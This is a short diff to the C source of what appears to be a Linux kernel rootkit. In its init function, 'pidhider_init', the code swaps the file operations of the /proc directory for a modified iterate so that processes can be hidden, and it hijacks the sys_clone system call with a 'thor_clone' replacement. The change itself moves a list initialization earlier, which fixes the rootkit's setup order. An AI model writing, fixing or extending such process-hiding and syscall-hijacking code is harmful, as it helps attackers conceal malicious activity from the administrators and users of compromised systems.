@@ -103,6 +103,8 @@ int pidhider_init(void)
 {
     void *iterate_addr;
 
+    INIT_LIST_HEAD(&pid_list.list);
+
     /* insert our modified iterate for /proc */
     procroot = procfile->parent;
     proc_fops = (struct file_operations*) procroot->proc_fops;
@@ -137,8 +139,6 @@ int pidhider_init(void)
 #ifdef __ARCH_WANT_SYS_CLONE
     hijack(sys_clone, thor_clone);
 #endif
-
-    INIT_LIST_HEAD(&pid_list.list);
 
     return 0;
 }
